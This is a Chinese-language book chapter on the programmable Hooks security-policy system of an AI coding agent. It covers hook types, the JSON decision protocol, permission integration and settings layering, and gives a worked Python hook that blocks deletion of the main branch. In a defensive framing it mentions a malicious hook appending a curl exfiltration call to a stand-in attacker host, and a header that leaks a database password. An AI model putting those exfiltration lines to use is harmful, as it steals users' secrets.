---
title: "Hooks：可编程的安全策略"
part: 4
chapter: 11
---

# Chapter 11: Hooks：可编程的安全策略

> 如果你的团队规定"禁止删除 main 分支"，在 allow/deny 规则里怎么表达？

## 11.1 硬编码规则的天花板

前两章剖析的权限系统有一个根本局限：所有规则都是**声明式**的。

你可以说"允许 Bash(git *)"或"拒绝整个 Bash 工具"，
但你无法表达"只拒绝 git push 到 main 分支的操作"，
也无法表达"所有 SQL 操作必须经过审计服务"。

这些需求有一个共同特征：
它们需要**理解操作内容**，而非仅仅匹配工具名或命令前缀。
一个团队禁止向公开 npm registry 发布包，
另一个团队要求所有数据库迁移必须经过 DBA 审核——
这些策略的多样性远超预设规则的表达能力。

Hooks 就是为此而生的：
一个可编程的策略扩展点，让用户用自己的代码参与权限决策。

如果说 deny/allow 规则是交通信号灯，
那 Hooks 就是交警——交警可以根据现场情况
做出信号灯无法表达的判断。

## 11.2 四种 Hook 类型：从 shell 脚本到自主验证器

Hook 配置 schema 模块定义了四种 Hook 类型，
每种适配不同的复杂度需求。

### Command Hook

最直接的形式——执行一个 shell 命令。
Hook 进程通过 stdin 接收 JSON 格式的事件数据，
通过 stdout 返回 JSON 格式的决策结果。

`shell` 字段支持 bash 和 powershell。
`timeout` 限制执行时间，防止 Hook 无限期阻塞。
`once` 标记一次性 Hook——执行后自动移除，适合初始化场景。
`async` 支持后台执行模式——Hook 不阻塞主流程。
`asyncRewake` 更进一步：在后台执行，但如果退出码为 2，
会唤醒模型处理 Hook 报告的阻塞性错误。

### Prompt Hook

用一个独立的 LLM 来评估操作。
`$ARGUMENTS` 占位符会被替换为 Hook 输入的 JSON。

这本质上是"用 AI 审计 AI"——
可以用轻量模型做快速语义检查。
比如"这个 shell 命令是否试图读取环境变量并发送到外部"
——这种意图级别的判断，单纯的模式匹配做不到，
但一个小模型可以在几百毫秒内给出合理的判断。

`model` 字段允许指定使用哪个模型，
默认使用轻量快速模型，不会占用主循环模型的资源。

### HTTP Hook

将事件 POST 到远程 URL。
适合集成企业级安全审计系统、合规检查服务、SIEM 平台。

`allowedEnvVars` 是一个精心设计的安全边界：
只有显式列出的环境变量才会在 header 中被插值解析，
未列出的 `$VAR` 引用变为空字符串。

为什么需要这个限制？
考虑这个场景：恶意的项目级 Hook 配置了一个 HTTP Hook，
header 中写 `"Authorization": "Bearer $DATABASE_PASSWORD"`。
如果没有 `allowedEnvVars` 白名单，
这个 Hook 就能通过 HTTP 请求将数据库密码泄露到攻击者的服务器。
白名单机制确保了只有开发者显式授权的变量才会被解析。

### Agent Hook

启动一个完整的 Agent 来执行验证。
与 Prompt Hook 的关键区别是：
Prompt Hook 只做一次 LLM 调用，
Agent Hook 可以多轮推理、调用工具。

适合复杂的验证逻辑：
"验证单元测试是否通过"需要实际运行测试命令；
"检查代码是否符合团队风格指南"需要读取配置文件并对比。
这些超出了单次 LLM 调用的能力范围。

### 共性：`if` 预过滤

四种类型都支持 `if` 字段作为预过滤器。
它使用与权限规则相同的语法（如 `Bash(git *)`），
在 Hook 进程启动之前做模式匹配。

这是一个重要的性能优化。
没有 `if` 过滤的 Command Hook 会在每次工具调用时都启动子进程；
有了 `if: "Bash(git push *)"` 过滤，
只有匹配 `git push` 的命令才会触发 Hook 子进程。
对于一个典型的 Agent 会话（可能包含数十次工具调用），
这个过滤可以避免大量不必要的进程创建开销。

## 11.3 Hook 的响应协议：标准化的决策接口

Hook 通过 stdout 返回 JSON 来影响系统行为。
Hook 类型定义模块定义了完整的响应 schema。

### 同步响应

同步响应 schema 中几个关键字段：

`continue`——设为 false 可以停止 Agent 继续执行。
配合 `stopReason` 字段，可以给出停止的原因。

`decision`——`approve` 或 `block`，直接影响权限决策。
配合 `reason` 字段，向用户解释为什么。

`suppressOutput`——隐藏 Hook 自身的 stdout 输出，
避免审计日志或调试信息干扰 Agent 的对话上下文。

`systemMessage`——向用户显示警告信息，
不进入 Agent 对话上下文，只作为 UI 提示。

### PreToolUse 特定输出

对于 `PreToolUse` 事件，
Hook 可以返回三个额外字段：

`permissionDecision`（allow/deny/ask）——
直接覆盖工具自检的权限判断。
`updatedInput`——修改工具的输入参数。
`additionalContext`——为 Agent 注入额外上下文信息。

`updatedInput` 是最强大的能力：
一个安全策略 Hook 可以在 `git push` 命令前
自动添加 `--no-force` 参数；
一个审计 Hook 可以在 SQL 命令中自动添加 `LIMIT 1000`。
工具行为被"在飞行中"修改，Agent 和用户都感知不到。

### PermissionRequest 特定输出

对于 `PermissionRequest` 事件，
Hook 可以返回结构化的 allow 或 deny 决策。

allow 决策可以附带 `updatedPermissions`——
在允许操作的同时更新权限规则。
比如"允许这次操作，并将此命令前缀加入会话级白名单"。

deny 决策可以附带 `interrupt: true`——
不仅拒绝当前操作，还通过中止控制器中止整个 Agent。
这是"紧急制动"——
当 Hook 检测到严重安全威胁（比如疑似 prompt 注入攻击）时，
可以立即停止一切。

### 异步响应

返回 `{async: true}` 表示 Hook 在后台继续执行，
不阻塞主流程。
可选的 `asyncTimeout` 字段设置后台执行的超时时间。
适用于审计日志写入、异步通知推送等不需要等待结果的场景。

## 11.4 Hook 与权限系统的两个集成点

Hook 在权限流程中有两个截然不同的介入时机。

### PreToolUse：在决策链中插入一票否决

PreToolUse Hook 在工具执行前触发。
Hook 结果类型中的 `permissionBehavior` 字段可以设为 `allow`、`deny`、`ask` 或 `passthrough`。

如果 Hook 说 deny，
即使工具自检和规则引擎都通过了也会被拒绝——
这给了外部策略系统一个"一票否决权"。

如果 Hook 说 allow，
它会在后续流程中加速通过。
但 safetyCheck 仍然不可绕过，
因为 Step 1g 在 Hook 介入之后执行——
这保证了即使一个被入侵的 Hook 声称 allow，
对 `.git/` 的修改仍然需要人类确认。

### PermissionRequest：与用户对话框竞赛

当权限决策为 `ask` 且需要弹出用户对话框时，
PermissionRequest Hook 与对话框**同时运行**。
回顾 Chapter 9 的 `resolveOnce` 机制——
Hook 是那场竞赛的参与者之一。

协调者处理模块展示了自动化优先场景的执行顺序：
先跑 Hook（快速、本地），
再跑分类器（慢、推理），
都不行才回退到对话框。

在交互式场景中，
Hook 以异步方式启动，
与 UI 对话框、ML 分类器、桌面端 Bridge 等并行竞赛。
通过 `claim()` 原子操作确保只有第一个响应者获胜。

这个竞赛语义带来了一个重要的体验特性：
如果你的 Hook 能在 100ms 内做出判断，
用户甚至不会看到权限弹窗。
Hook 的存在对用户是透明的——它只加速决策，不增加延迟。

## 11.5 配置方式：三层来源，松耦合集成

Hooks 在 `settings.json` 中配置。
Hook 配置 schema 模块定义了顶层结构：
一个以 Hook 事件名为键、匹配器数组为值的偏记录。

每个匹配器包含可选的 `matcher`（工具名过滤）和 `hooks` 数组。
`matcher` 做第一级过滤（只对特定工具触发），
`if` 做第二级过滤（只对匹配模式的调用启动 Hook）。
双层过滤确保了 Hook 只在真正需要的时刻执行。

配置支持三层来源：

- **用户级**（`~/.claude/settings.json`）：全局策略，适用于所有项目。
- **项目级**（`.claude/settings.json`）：团队策略，提交到版本控制。
- **本地级**（`.claude/settings.local.json`）：个人偏好，不进仓库。

松耦合是 Hook 系统的核心设计原则。
Hook 通过 stdin/stdout 的 JSON 协议与主进程通信，
不依赖任何编程语言或运行时。
Python 脚本、Node.js 程序、curl 调用、甚至一个 jq 管道——
只要能读 stdin 写 stdout，就能成为安全策略。

## 11.6 实战案例：禁止删除 main 分支

将所有概念串联起来。
假设团队需要禁止任何删除 main 分支的 git 操作。

创建 `.claude/hooks/protect-main.py`：

```python
#!/usr/bin/env python3
import json, sys

data = json.load(sys.stdin)
cmd = data.get("tool_input", {}).get("command", "")

dangerous = ["branch -d main", "branch -D main",
             "push origin :main", "push origin --delete main"]

if any(p in cmd for p in dangerous):
    json.dump({"decision": "block",
               "reason": "Team policy: main branch deletion forbidden."
              }, sys.stdout)
else:
    json.dump({"decision": "approve"}, sys.stdout)
```

配置在 `.claude/settings.json` 中：

```json
{
  "hooks": {
    "PreToolUse": [{
      "matcher": "Bash",
      "hooks": [{
        "type": "command",
        "command": "python3 .claude/hooks/protect-main.py",
        "if": "Bash(git *)",
        "timeout": 5,
        "statusMessage": "Checking branch protection..."
      }]
    }]
  }
}
```

执行流程：
Agent 请求 `git branch -D main` ->
PreToolUse 事件触发 ->
`matcher: "Bash"` 匹配成功 ->
`if: "Bash(git *)"` 匹配成功 ->
Hook 进程启动，stdin 接收 JSON ->
Python 检测到危险模式 ->
stdout 输出 block 决策 ->
权限引擎收到 deny ->
Agent 看到 "Permission denied: Team policy..." 然后选择替代方案。

整个过程对 Agent 透明——它只知道被拒绝了，
不知道是 Hook、用户还是分类器拒绝的。

## 11.7 安全设计：Hook 本身不能成为攻击面

Hook 系统本身也需要安全机制，
否则它就成了一个新的攻击入口。

**信任域隔离。**
Hook 脚本必须由用户显式配置在 `settings.json` 中，
而不是由 Agent 动态创建。
首次加载包含 hooks 的项目设置时，
需要用户通过信任对话框确认。
这防止了"恶意仓库在 `.claude/settings.json` 中预置后门 Hook"的攻击。

**超时强制。**
每个 Hook 都有超时限制（`timeout` 字段），
防止恶意或有 bug 的 Hook 永久阻塞 Agent。
没有配置超时的 Hook 使用系统默认超时。

**管理策略优先。**
在企业环境中，`policySettings` 来源的 Hook 优先级最高。
管理 Hook 独占开关禁止非管理 Hook 执行
——确保只有企业安全团队审核过的 Hook 能运行。
全局禁用开关在紧急情况下禁用一切 Hook——这是最后的安全阀。

**输出验证。**
Hook 的 JSON 输出经过 Zod schema 严格验证。
无效的响应被安全忽略而不会导致系统崩溃。
这是防御性编程的典型实践——永远不信任外部输入，
即使那个"外部"是用户自己编写的 Hook 脚本。

**环境变量隔离。**
HTTP Hook 的 `allowedEnvVars` 使用白名单机制。
如果未列出 `DATABASE_PASSWORD`，
即使 header 配置中写了 `$DATABASE_PASSWORD`，
也会被解析为空字符串。
白名单，不是黑名单——这个方向性选择至关重要。

## 11.8 27 种事件：覆盖 Agent 生命周期

Hook 系统的骨架是 27 种事件（定义在 Agent SDK 类型模块中）。
与权限直接相关的三个核心事件——
`PreToolUse`、`PermissionRequest`、`PermissionDenied`——
我们已经详细讨论过。

其余事件覆盖了 Agent 生命周期的方方面面：

**会话级**：
`SessionStart`/`SessionEnd`（启动和结束）、
`Setup`（首次安装）、`ConfigChange`（配置变更）。

**工具级**：
`PostToolUse`/`PostToolUseFailure`（执行后/失败后）、
`CwdChanged`（工作目录切换）、`FileChanged`（文件变更）。

**Agent 级**：
`SubagentStart`/`SubagentStop`（子 Agent 管理）、
`Stop`/`StopFailure`（Agent 停止）。

**协作级**：
`TeammateIdle`（团队成员空闲）、
`TaskCreated`/`TaskCompleted`（任务生命周期）。

**上下文级**：
`PreCompact`/`PostCompact`（上下文压缩前后）、
`InstructionsLoaded`（指令加载完成）。

这种全生命周期覆盖意味着
Hook 不仅仅是权限的扩展——
它是 Agent 行为的通用可编程接口。
你可以用 `PostToolUse` Hook 在每次代码修改后自动运行 linter，
用 `SessionStart` Hook 初始化项目环境，
用 `Stop` Hook 生成会话摘要报告。

## 11.9 小结：从预设规则到可编程策略

Hook 系统将权限模型从"声明式规则"提升到了"可编程策略"。
其设计智慧体现在三个层面：

**渐进增强。**
不配置任何 Hook，系统照常运行。
添加一个 Hook，只增强一个决策点。
Hook 是纯粹的增量，不改变基础行为。

**竞赛语义。**
PermissionRequest Hook 与用户对话框、ML 分类器并行竞赛。
如果 Hook 比用户反应快，用户感知不到 Hook 的存在。

**松耦合协议。**
stdin/stdout JSON 协议意味着任何编程语言都能编写 Hook。
企业安全团队可以用 Go 编写高性能审计服务，
个人开发者可以用三行 bash 实现简单的模式匹配。

从更宏观的视角看，Hook 体系完成了一个重要闭环：
用户不仅是权限系统的被动受益者，
更是策略制定的主动参与者。
当内置规则不够用时，
用户用自己的代码来表达安全意图——
这就是可编程安全策略的力量。

---

**思考题**

1. PreToolUse Hook 可以返回 `updatedInput` 来修改工具输入。
如果一个恶意的项目级 Hook 悄悄修改了 Bash 命令内容
（比如追加 `&& curl attacker.com/steal`），
现有的安全机制能否检测到？你会如何设计防护？

2. Agent Hook 启动一个完整的 Agent 来验证操作。
但这个验证 Agent 本身也需要调用工具（比如读文件检查测试结果），
它的工具调用是否也需要权限检查？
如果需要，会不会形成无限递归？

3. Hook 的 `if` 字段使用与权限规则相同的匹配语法。
但这种语法的表达能力有限——
无法匹配"包含 `--force` 参数的 git push"。
如果你要扩展 `if` 的表达能力，
你会选择正则表达式、JSONPath 还是其他方案？
每种方案的安全性和性能权衡是什么？
